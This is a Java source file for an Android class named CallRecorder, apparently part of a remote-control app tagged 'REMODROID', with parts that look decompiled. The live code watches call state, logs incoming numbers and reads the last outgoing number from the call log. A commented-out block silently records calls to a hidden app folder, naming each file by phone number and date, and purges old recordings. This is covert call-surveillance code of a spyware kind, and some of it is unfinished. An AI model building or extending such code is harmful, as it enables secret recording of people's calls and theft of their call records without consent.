package com.remo.features;


import android.database.Cursor;
import android.media.MediaRecorder;
import android.os.Handler;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.remo.App;

import java.io.File;

public class CallRecorder extends PhoneStateListener {
  //  Context context;
    private MediaRecorder mediaRecorder;
    private static int a = 0;
    private static String b = "";
    private String Incoming_number = "";
    private static final File RecordsPath = new File (App.get().getApplicationContext().getFilesDir().getAbsolutePath(),"Rec");
    
     
    
  //  final /* synthetic */ CallRec c;

    public CallRecorder() {
  //      this.c = CallRec;
       // RecordsPath = new File (App.get().getApplicationContext().getFilesDir().getAbsolutePath(),"/Rec");
       // this.context = context;
        Log.d("REMODROID",RecordsPath.getAbsolutePath());
    }




    private boolean isPhoneCalling = false;

    @Override
    public void onCallStateChanged(int state, String incomingNumber) {

        if (TelephonyManager.CALL_STATE_RINGING == state) {
            // phone ringing
            Log.i("REMODROID", "RINGING, number: " + incomingNumber);
        }

        if (TelephonyManager.CALL_STATE_OFFHOOK == state) {
            // active
            Log.i("REMODROID", "OFFHOOK");

            isPhoneCalling = true;
        }

        if (TelephonyManager.CALL_STATE_IDLE == state) {
            // run when class initial and phone call ended, need detect flag
            // from CALL_STATE_OFFHOOK
            Log.i("REMODROID", "IDLE");

            if (isPhoneCalling) {

                Handler handler = new Handler();

                //Put in delay because call log is not updated immediately when state changed
                // The dialler takes a little bit of time to write to it 500ms seems to be enough
                handler.postDelayed(new Runnable() {

                    @Override
                    public void run() {
                        try {
                            // get start of cursor
                            //Log.i("REMODROID", "Getting Log activity...");
                            String[] projection = new String[]{CallLog.Calls.NUMBER};
                            Cursor cur = App.get().getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE +" desc");
                            cur.moveToFirst();
                            String lastCallnumber = cur.getString(0);
                            Log.i("REMODROID", "Out going Number "+lastCallnumber);
                        }catch (SecurityException e){

                        }

                    }
                },500);

                isPhoneCalling = false;
            }

        }
    }


    private void renameTemp(String number,String callType){


    }



    
//    @Override
//    public void onCallStateChanged(int i, String str) {
//        int i2 = 0;
//        if (i != a) {
//            switch (i) {
//                case 0:
//                    Log.d("REMODROID","I");
//                    b = "";
//                    if (a == 2) {
//                        this.mediaRecorder.stop();
//                        this.mediaRecorder.release();
//                        this.mediaRecorder = null;
//                    }
//                    if (this.mediaRecorder != null) {
//                        try {
//                            this.mediaRecorder.stop();
//                            this.mediaRecorder.release();
//                            this.mediaRecorder = null;
//                        } catch (Exception e) {
//                        }
//                    }
//                    a = 0;
//                    return;
//                case 1:
//                    Log.d("REMODROID","R");
//                    a = 1;
//                    Log.d("REMODROID","incomingNumber:" + str);
//                    b = str;
//                    return;
//                case 2:
//                    Log.d("REMODROID","O");
//                    try {
//                        if (getSize(RecordsPath) > 52428800) {
//                            deleteAllCalls(RecordsPath);
//                        }
//                    } catch (Exception e2) {
//                    }
//                    try {
//                        String str2;
//                        String formated_date = new SimpleDateFormat("yyyy.MM.dd  HH.mm.ss",Locale.US).format(new Date());
//                        if (a == 1 || b.length() > 0) {
//                            str2 = RecordsPath + "/Call-" + b + "-IN-" + formated_date + ".mp3";
//                            b = "";
//                            Log.d("REMODROID","INCOMING STATE");
//                        } else {
//                            while (Incoming_number.equals("") && i2 < 60) {
//                                int i3 = i2 + 1;
//                                try {
//                                    Thread.sleep(100);
//                                    Log.d("REMODROID","Out Going Waiting......");
//                                    i2 = i3;
//                                } catch (InterruptedException e3) {
//                                    e3.printStackTrace();
//                                    i2 = i3;
//                                }
//                            }
//                            String str3 = RecordsPath + "/Call-" + Incoming_number + "-OUT-" + formated_date + ".mp3";
//                            try {
//                                Thread.sleep(100);
//                                Log.d("REMODROID","Out Going Waiting......");
//                            } catch (InterruptedException e32) {
//                                e32.printStackTrace();
//                            }
//                            Incoming_number = "";
//                            str2 = str3;
//                        }
//                        a = 2;
//                        this.mediaRecorder = new MediaRecorder();
//                        try {
//                            this.mediaRecorder.setAudioSource(4);
//                        } catch (Exception e4) {
//                            this.mediaRecorder.setAudioSource(1);
//                        }
//                        try {
//                            this.mediaRecorder.setOutputFormat(2);
//                            this.mediaRecorder.setOutputFile(str2);
//                            this.mediaRecorder.setAudioEncoder(3);
//                            try {
//                                this.mediaRecorder.prepare();
//                            } catch (IOException e5) {
//                                e5.printStackTrace();
//                            }
//                            this.mediaRecorder.start();
//                            return;
//                        } catch (Exception e6) {
//                            e6.printStackTrace();
//                            return;
//                        }
//                    } catch (Exception e7) {
//                        if (this.mediaRecorder != null) {
//                            try {
//                                this.mediaRecorder.stop();
//                                this.mediaRecorder.release();
//                                this.mediaRecorder = null;
//                            } catch (Exception e8) {
//                                return;
//                            }
//                        }
//                    }
//                default:
//                    if (this.mediaRecorder != null) {
//                        this.mediaRecorder.stop();
//                        this.mediaRecorder.release();
//                        this.mediaRecorder = null;
//                    }
//                    return;
//            }
//
//        }
//    }



    private static long getSize(File file) {
        if (!file.isDirectory()) {
            return file.length();
        }
        long j = 0;
        for (File file2 : file.listFiles()) {
            if (file2.getName().startsWith("Call--")) {
 //               file2.delete();
            } else {
                j += getSize(file2);
            }
        }
        return j;
    }

    private static void deleteAllCalls(File file) {
        if (file.isDirectory()) {
            for (File file2 : file.listFiles()) {
                if (file2.getName().startsWith("Call")) {
         //           file2.delete();
                }
            }
        }
    }




}
